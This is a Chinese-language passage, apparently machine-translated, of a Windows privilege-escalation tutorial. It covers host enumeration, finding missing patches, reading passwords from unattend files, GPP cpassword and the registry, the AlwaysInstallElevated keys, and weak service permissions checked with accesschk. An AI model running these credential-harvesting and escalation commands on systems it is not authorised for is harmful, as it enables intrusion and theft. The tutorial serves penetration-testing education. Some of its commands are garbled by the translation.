与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。 应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。 最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。 不可或缺的资源：Windows Privilege Escalation百科全书（Brett Moore） - 这里。Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） - 这里。通过利用弱文件夹权限提升权限（Parvez Anwar） - 这里。 Δt for t0 to t3 - 初始信息收集 本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。 最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。 首先让我们找出我们连接的操作系统： C:\\Windows\\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。 C:\\Windows\\system32&gt; hostname b33f C:\\Windows\\system32&gt; echo %username% user1 现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。 C:\\Windows\\system32&gt; net users User accounts for \\\\B33F ------------------------------------------------------------------------------- Administrator b33f Guest user1 The command completed successfully. C:\\Windows\\system32&gt; net user user1 User name user1 Full Name Comment User&#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 1/11/2014 7:47:14 PM Password expires Never Password changeable 1/11/2014 7:47:14 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 1/11/2014 8:05:09 PM Logon hours allowed All Local Group Memberships *Users Global Group memberships *None The command completed successfully. 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。 首先让我们看一下可用的网络接口和路由表。 C:\\Windows\\system32&gt; ipconfig /all Windows IP Configuration Host Name . . . . . . . . . . . . : b33f Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No Ethernet adapter Bluetooth Network Connection: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network) Physical Address. . . . . . . . . : 0C-84-DC-62-60-29 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection Physical Address. . . . . . . . . : 00-0C-29-56-79-35 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred) IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM Default Gateway . . . . . . . . . : 192.168.0.1 DHCP Server . . . . . . . . . . . : 192.168.0.1 DHCPv6 IAID . . . . . . . . . . . : 234884137 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35 DNS Servers . . . . . . . . . . . : 192.168.0.1 NetBIOS over Tcpip. . . . . . . . : Enabled C:\\Windows\\system32&gt; route print =========================================================================== Interface List 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network) 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection 1...........................Software Loopback Interface 1 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface =========================================================================== IPv4 Route Table =========================================================================== Active Routes: Network Destination Netmask Gateway Interface Metric 0.0.0.0 0.0.0.0 192.168.0.1 192.168.0.104 10 127.0.0.0 255.0.0.0 On-link 127.0.0.1 306 127.0.0.1 255.255.255.255 On-link 127.0.0.1 306 127.255.255.255 255.255.255.255 On-link 127.0.0.1 306 192.168.0.0 255.255.255.0 On-link 192.168.0.104 266 192.168.0.104 255.255.255.255 On-link 192.168.0.104 266 192.168.0.255 255.255.255.255 On-link 192.168.0.104 266 224.0.0.0 240.0.0.0 On-link 127.0.0.1 306 224.0.0.0 240.0.0.0 On-link 192.168.0.104 266 255.255.255.255 255.255.255.255 On-link 127.0.0.1 306 255.255.255.255 255.255.255.255 On-link 192.168.0.104 266 =========================================================================== Persistent Routes: None IPv6 Route Table =========================================================================== Active Routes: If Metric Network Destination Gateway 14 58 ::/0 On-link 1 306 ::1/128 On-link 14 58 2001::/32 On-link 14 306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128 On-link 11 266 fe80::/64 On-link 14 306 fe80::/64 On-link 14 306 fe80::8d2:b4e:3f57:ff97/128 On-link 11 266 fe80::5cd4:9caf:61c0:ba6e/128 On-link 1 306 ff00::/8 On-link 14 306 ff00::/8 On-link 11 266 ff00::/8 On-link =========================================================================== Persistent Routes: None # arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces. C:\\Windows\\system32&gt; arp -A Interface: 192.168.0.104 --- 0xb Internet Address Physical Address Type 192.168.0.1 90-94-e4-c5-b0-46 dynamic 192.168.0.101 ac-22-0b-af-bb-43 dynamic 192.168.0.255 ff-ff-ff-ff-ff-ff static 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.251 01-00-5e-00-00-fb static 224.0.0.252 01-00-5e-00-00-fc static 239.255.255.250 01-00-5e-7f-ff-fa static 255.255.255.255 ff-ff-ff-ff-ff-ff static 这将我们带到活动网络连接和防火墙规则。 C:\\Windows\\system32&gt; netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 684 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:5354 0.0.0.0:0 LISTENING 1400 TCP 192.168.0.104:139 0.0.0.0:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 684 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:5357 [::]:0 LISTENING 4 UDP 0.0.0.0:5355 *:* 1100 UDP 0.0.0.0:52282 *:* 976 UDP 0.0.0.0:55202 *:* 2956 UDP 0.0.0.0:59797 *:* 1400 UDP 127.0.0.1:1900 *:* 2956 UDP 127.0.0.1:65435 *:* 2956 UDP 192.168.0.104:137 *:* 4 UDP 192.168.0.104:138 *:* 4 UDP 192.168.0.104:1900 *:* 2956 UDP 192.168.0.104:5353 *:* 1400 UDP 192.168.0.104:65434 *:* 2956 UDP [::]:5355 *:* 1100 UDP [::]:52281 *:* 976 UDP [::]:52283 *:* 976 UDP [::]:55203 *:* 2956 UDP [::]:59798 *:* 1400 UDP [::1]:1900 *:* 2956 UDP [::1]:5353 *:* 1400 UDP [::1]:65433 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:1900 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:65432 *:* 2956 # The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh firewall commands are only available from XP SP2 and upwards. C:\\Windows\\system32&gt; netsh firewall show state Firewall status: ------------------------------------------------------------------- Profile = Standard Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Group policy version = Windows Firewall Remote admin mode = Disable Ports currently open on all network interfaces: Port Protocol Version Program ------------------------------------------------------------------- No ports are currently open on all network interfaces. C:\\Windows\\system32&gt; netsh firewall show config Domain profile configuration: ------------------------------------------------------------------- Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Allowed programs configuration for Domain profile: Mode Traffic direction Name / Program ------------------------------------------------------------------- Port configuration for Domain profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Domain profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Standard profile configuration (current): ------------------------------------------------------------------- Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Service configuration for Standard profile: Mode Customized Name ------------------------------------------------------------------- Enable No Network Discovery Allowed programs configuration for Standard profile: Mode Traffic direction Name / Program ------------------------------------------------------------------- Enable Inbound COMRaider / E:\\comraider\\comraider.exe Enable Inbound nc.exe / C:\\users\\b33f\\desktop\\nc.exe Port configuration for Standard profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Standard profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Log configuration: ------------------------------------------------------------------- File location = C:\\Windows\\system32\\LogFiles\\Firewall\\pfirewall.log Max file size = 4096 KB Dropped packets = Disable Connections = Disable 最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。 # This will display verbose output for all scheduled tasks, below you can see sample output for a single task. C:\\Windows\\system32&gt; schtasks /query /fo LIST /v Folder: \\Microsoft\\Windows Defender HostName: B33F TaskName: \\Microsoft\\Windows Defender\\MP Scheduled Scan Next Run Time: 1/22/2014 5:11:13 AM Status: Ready Logon Mode: Interactive/Background Last Run Time: N/A Last Result: 1 Author: N/A Task To Run: c:\\program files\\windows defender\\MpCmdRun.exe Scan -ScheduleJob -WinTask -RestrictPrivilegesScan Start In: N/A Comment: Scheduled Scan Scheduled Task State: Enabled Idle Time: Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes Power Management: No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Enabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: Daily Start Time: 5:11:13 AM Start Date: 1/1/2000 End Date: 1/1/2100 Days: Every 1 day(s) Months: N/A Repeat: Every: Disabled Repeat: Until: Time: Disabled Repeat: Until: Duration: Disabled Repeat: Stop If Still Running: Disabled [..Snip..] # The following command links running processes to started services. C:\\Windows\\system32&gt; tasklist /SVC Image Name PID Services ========================= ======== ============================================ System Idle Process 0 N/A System 4 N/A smss.exe 244 N/A csrss.exe 332 N/A csrss.exe 372 N/A wininit.exe 380 N/A winlogon.exe 428 N/A services.exe 476 N/A lsass.exe 484 SamSs lsm.exe 496 N/A svchost.exe 588 DcomLaunch, PlugPlay, Power svchost.exe 668 RpcEptMapper, RpcSs svchost.exe 760 Audiosrv, Dhcp, eventlog, HomeGroupProvider, lmhosts, wscsvc svchost.exe 800 AudioEndpointBuilder, CscService, Netman, SysMain, TrkWks, UxSms, WdiSystemHost, wudfsvc svchost.exe 836 AeLookupSvc, BITS, gpsvc, iphlpsvc, LanmanServer, MMCSS, ProfSvc, Schedule, seclogon, SENS, ShellHWDetection, Themes, Winmgmt, wuauserv audiodg.exe 916 N/A svchost.exe 992 EventSystem, fdPHost, netprofm, nsi, WdiServiceHost, WinHttpAutoProxySvc svchost.exe 1104 CryptSvc, Dnscache, LanmanWorkstation, NlaSvc spoolsv.exe 1244 Spooler svchost.exe 1272 BFE, DPS, MpsSvc mDNSResponder.exe 1400 Bonjour Service taskhost.exe 1504 N/A taskeng.exe 1556 N/A vmtoolsd.exe 1580 VMTools dwm.exe 1660 N/A explorer.exe 1668 N/A vmware-usbarbitrator.exe 1768 VMUSBArbService TPAutoConnSvc.exe 1712 TPAutoConnSvc [..Snip..] C:\\Windows\\system32&gt; net start These Windows services are started: Application Experience Application Information Background Intelligent Transfer Service Base Filtering Engine Bluetooth Support Service Bonjour Service COM+ Event System COM+ System Application Cryptographic Services DCOM Server Process Launcher Desktop Window Manager Session Manager DHCP Client Diagnostic Policy Service Diagnostic Service Host Diagnostic System Host Distributed Link Tracking Client Distributed Transaction Coordinator DNS Client Function Discovery Provider Host Function Discovery Resource Publication Group Policy Client [..Snip..] # This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise. C:\\Windows\\system32&gt; DRIVERQUERY Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 11/20/2010 6:01:11 PM ACPI Microsoft ACPI Driver Kernel 11/20/2010 4:37:52 PM AcpiPmi ACPI Power Meter Drive Kernel 11/20/2010 4:47:55 PM adp94xx adp94xx Kernel 12/6/2008 7:59:55 AM adpahci adpahci Kernel 5/2/2007 1:29:26 AM adpu320 adpu320 Kernel 2/28/2007 8:03:08 AM AFD Ancillary Function Dri Kernel 11/20/2010 4:40:00 PM agp440 Intel AGP Bus Filter Kernel 7/14/2009 7:25:36 AM aic78xx aic78xx Kernel 4/12/2006 8:20:11 AM aliide aliide Kernel 7/14/2009 7:11:17 AM amdagp AMD AGP Bus Filter Dri Kernel 7/14/2009 7:25:36 AM amdide amdide Kernel 7/14/2009 7:11:19 AM AmdK8 AMD K8 Processor Drive Kernel 7/14/2009 7:11:03 AM AmdPPM AMD Processor Driver Kernel 7/14/2009 7:11:03 AM amdsata amdsata Kernel 3/19/2010 9:08:27 AM amdsbs amdsbs Kernel 3/21/2009 2:35:26 AM amdxata amdxata Kernel 3/20/2010 12:19:01 AM AppID AppID Driver Kernel 11/20/2010 5:29:48 PM arc arc Kernel 5/25/2007 5:31:06 AM [..Snip..] Δt for t4 - WMIC的奥术艺术 我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。 完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。 我在下面列出了两个非常值得阅读的资源：Command-Line Ninjitsu（SynJunkie） - 这里是Windows WMIC命令行（ComputerHope） - 这里 不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。 为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。 C:\\Windows\\system32&gt; wmic /? [global switches] The following global switches are available: /NAMESPACE Path for the namespace the alias operate against. /ROLE Path for the role containing the alias definitions. /NODE Servers the alias will operate against. /IMPLEVEL Client impersonation level. /AUTHLEVEL Client authentication level. /LOCALE Language id the client should use. /PRIVILEGES Enable or disable all privileges. /TRACE Outputs debugging information to stderr. /RECORD Logs all input commands and output. /INTERACTIVE Sets or resets the interactive mode. /FAILFAST Sets or resets the FailFast mode. /USER User to be used during the session. /PASSWORD Password to be used for session login. /OUTPUT Specifies the mode for output redirection. /APPEND Specifies the mode for output redirection. /AGGREGATE Sets or resets aggregate mode. /AUTHORITY Specifies the for the connection. /?[:&lt;BRIEF|FULL&gt;] Usage information. For more information on a specific global switch, type: switch-name /? The following alias/es are available in the current role: ALIAS - Access to the aliases available on the local system BASEBOARD - Base board (also known as a motherboard or system board) management. BIOS - Basic input/output services (BIOS) management. BOOTCONFIG - Boot configuration management. CDROM - CD-ROM management. COMPUTERSYSTEM - Computer system management. CPU - CPU management. CSPRODUCT - Computer system product information from SMBIOS. DATAFILE - DataFile Management. DCOMAPP - DCOM Application management. DESKTOP - User&#39;s Desktop management. DESKTOPMONITOR - Desktop Monitor management. DEVICEMEMORYADDRESS - Device memory addresses management. DISKDRIVE - Physical disk drive management. DISKQUOTA - Disk space usage for NTFS volumes. DMACHANNEL - Direct memory access (DMA) channel management. ENVIRONMENT - System environment settings management. FSDIR - Filesystem directory entry management. GROUP - Group account management. IDECONTROLLER - IDE Controller management. IRQ - Interrupt request line (IRQ) management. JOB - Provides access to the jobs scheduled using the schedule service. LOADORDER - Management of system services that define execution dependencies. LOGICALDISK - Local storage device management. LOGON - LOGON Sessions. MEMCACHE - Cache memory management. MEMORYCHIP - Memory chip information. MEMPHYSICAL - Computer system&#39;s physical memory management. NETCLIENT - Network Client management. NETLOGIN - Network login information (of a particular user) management. NETPROTOCOL - Protocols (and their network characteristics) management. NETUSE - Active network connection management. NIC - Network Interface Controller (NIC) management. NICCONFIG - Network adapter management. NTDOMAIN - NT Domain management. NTEVENT - Entries in the NT Event Log. NTEVENTLOG - NT eventlog file management. ONBOARDDEVICE - Management of common adapter devices built into the motherboard (system board). OS - Installed Operating System/s management. PAGEFILE - Virtual memory file swapping management. PAGEFILESET - Page file settings management. PARTITION - Management of partitioned areas of a physical disk. PORT - I/O port management. PORTCONNECTOR - Physical connection ports management. PRINTER - Printer device management. PRINTERCONFIG - Printer device configuration management. PRINTJOB - Print job management. PROCESS - Process management. PRODUCT - Installation package task management. QFE - Quick Fix Engineering. QUOTASETTING - Setting information for disk quotas on a volume. RDACCOUNT - Remote Desktop connection permission management. RDNIC - Remote Desktop connection management on a specific network adapter. RDPERMISSIONS - Permissions to a specific Remote Desktop connection. RDTOGGLE - Turning Remote Desktop listener on or off remotely. RECOVEROS - Information that will be gathered from memory when the operating system fails. REGISTRY - Computer system registry management. SCSICONTROLLER - SCSI Controller management. SERVER - Server information management. SERVICE - Service application management. SHADOWCOPY - Shadow copy management. SHADOWSTORAGE - Shadow copy storage area management. SHARE - Shared resource management. SOFTWAREELEMENT - Management of the elements of a software product installed on a system. SOFTWAREFEATURE - Management of software product subsets of SoftwareElement. SOUNDDEV - Sound Device management. STARTUP - Management of commands that run automatically when users log onto the computer system. SYSACCOUNT - System account management. SYSDRIVER - Management of the system driver for a base service. SYSTEMENCLOSURE - Physical system enclosure management. SYSTEMSLOT - Management of physical connection points including ports, slots and peripherals, and proprietary connections points. TAPEDRIVE - Tape drive management. TEMPERATURE - Data management of a temperature sensor (electronic thermometer). TIMEZONE - Time zone data management. UPS - Uninterruptible power supply (UPS) management. USERACCOUNT - User account management. VOLTAGE - Voltage sensor (electronic voltmeter) data management. VOLUME - Local storage volume management. VOLUMEQUOTASETTING - Associates the disk quota setting with a specific disk volume. VOLUMEUSERQUOTA - Per user storage volume quota management. WMISET - WMI service operational parameters management. For more information on a specific alias, type: alias /? CLASS - Escapes to full WMI schema. PATH - Escapes to full WMI object paths. CONTEXT - Displays the state of all the global switches. QUIT/EXIT - Exits the program. For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /? 为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。 如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。 你可以在这里下载我的脚本（wmic_info.bat）Windows 7 VM上的示例输出文件（严重修补） - 此处 Δt for t5 to t6 - 快速失败 在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。 我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。 C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn Caption Description HotFixID InstalledOn http://support.microsoft.com/?kbid=2727528 Security Update KB2727528 11/23/2013 http://support.microsoft.com/?kbid=2729462 Security Update KB2729462 11/26/2013 http://support.microsoft.com/?kbid=2736693 Security Update KB2736693 11/26/2013 http://support.microsoft.com/?kbid=2737084 Security Update KB2737084 11/23/2013 http://support.microsoft.com/?kbid=2742614 Security Update KB2742614 11/23/2013 http://support.microsoft.com/?kbid=2742616 Security Update KB2742616 11/26/2013 http://support.microsoft.com/?kbid=2750149 Update KB2750149 11/23/2013 http://support.microsoft.com/?kbid=2756872 Update KB2756872 11/24/2013 http://support.microsoft.com/?kbid=2756923 Security Update KB2756923 11/26/2013 http://support.microsoft.com/?kbid=2757638 Security Update KB2757638 11/23/2013 http://support.microsoft.com/?kbid=2758246 Update KB2758246 11/24/2013 http://support.microsoft.com/?kbid=2761094 Update KB2761094 11/24/2013 http://support.microsoft.com/?kbid=2764870 Update KB2764870 11/24/2013 http://support.microsoft.com/?kbid=2768703 Update KB2768703 11/23/2013 http://support.microsoft.com/?kbid=2769034 Update KB2769034 11/23/2013 http://support.microsoft.com/?kbid=2769165 Update KB2769165 11/23/2013 http://support.microsoft.com/?kbid=2769166 Update KB2769166 11/26/2013 http://support.microsoft.com/?kbid=2770660 Security Update KB2770660 11/23/2013 http://support.microsoft.com/?kbid=2770917 Update KB2770917 11/24/2013 http://support.microsoft.com/?kbid=2771821 Update KB2771821 11/24/2013 [..Snip..] 与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。 您可以在下面看到grep补丁的语法： C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; 接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。 通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）： c:\\sysprep.inf c:\\sysprep\\sysprep.xml ％WINDIR％\\Panther\\Unattend\\Unattended.xml ％WINDIR％\\Panther\\Unattended.xml 这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。 `# This is a sample from sysprep.inf with clear-text credentials. This is a sample from sysprep.inf with clear-text credentials.[GuiUnattended]OEMSkipRegional=1OemSkipWelcome=1AdminPassword=s3cr3tp4ssw0rdTimeZone=20 This is a sample from sysprep.xml with Base64 “encoded” credentials. Please people Base64 is notencryption, I take more precautions to protect my coffee. The password here is “SuperSecurePassword”. U3VwZXJTZWN1cmVQYXNzd29yZA== false Local Administrator Administrator Administrators Administrator Sample from Unattended.xml with the same “secure” Base64 encoding. U3VwZXJTZWN1cmVQYXNzd29yZA== false true Administrator 根据Ben Campbell（[@Meatballs__](https://twitter.com/Meatballs__)）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。 除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性： Services \\ Services.xml：[特定于元素的属性](http://msdn.microsoft.com/en-us/library/cc980070.aspx) ScheduledTasks \\ ScheduledTasks.xml：[任务内部元素](http://msdn.microsoft.com/en-us/library/cc422920.aspx)，[TaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd341350.aspx)，[ImmediateTaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd304114.aspx) 打印机\\ Printers.xml：[SharedPrinter元素](http://msdn.microsoft.com/en-us/library/cc422918.aspx) 驱动器\\ Drives.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc704598.aspx) DataSources \\ DataSources.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc422926.aspx) 可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv06_big.png) 然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过[此处](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)建立的会话执行[，](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)或者（2）您可以使用Get-GPPPassword，它是[PowerSploit的](https://github.com/mattifestation/PowerSploit)一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。 接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \\ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在[这里查看](http://www.greyhathacker.net/?p=185)来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。 为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。 This will only work if both registry keys contain “AlwaysInstallElevated” with DWORD values of 1.C:\\Windows\\system32&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevatedC:\\Windows\\system32&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated 为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。 The command below will search the file system for file names containing certain keywords. You canspecify as many keywords as you wish. C:\\Windows\\system32&gt; dir /s pass == cred == vnc == .config Search certain file types for a keyword, this can generate a lot of output.C:\\Windows\\system32&gt; findstr /si password .xml .ini *.txt Similarly the two commands below can be used to grep the registry for keywords, in this case “password”.C:\\Windows\\system32&gt; reg query HKLM /f password /t REG_SZ /sC:\\Windows\\system32&gt; reg query HKCU /f password /t REG_SZ /s ## Δt for t7 to t10 - 卷起你的袖子 希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。 我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在[此处](http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx)从Microsoft technet下载该套件。 我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子 We can use sc to query, configure and manage windows services.C:\\Windows\\system32&gt; sc qc Spooler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Spooler TYPE : 110 WIN32_OWN_PROCESS (interactive) START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\System32\\spoolsv.exe LOAD_ORDER_GROUP : SpoolerGroup TAG : 0 DISPLAY_NAME : Print Spooler DEPENDENCIES : RPCSS : http SERVICE_START_NAME : LocalSystem 我们可以使用accesschk检查每个服务所需的权限级别。 We can see the permissions that each user level has, you can also use “accesschk.exe -ucqv *” to listall services. C:> accesschk.exe -ucqv Spooler Spooler R NT AUTHORITY\\Authenticated Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_USER_DEFINED_CONTROL READ_CONTROL R BUILTIN\\Power Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_USER_DEFINED_CONTROL READ_CONTROL RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。 让我们比较Windows 8和Windows XP SP0上的输出。 This is on Windows 8.C:\\Users\\b33f\\tools\\Sysinternals&gt; accesschk.exe -uwcqv “Authenticated Users” *No matching objects found. On a default Windows XP SP0 we can see there is a pretty big security fail.C:> accesschk.exe -uwcqv “Authenticated Users” *RW SSDPSRV SERVICE_ALL_ACCESSRW upnphost SERVICE_ALL_ACCESS C:> accesschk.exe -ucqv SSDPSRV SSDPSRV RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS C:> accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS 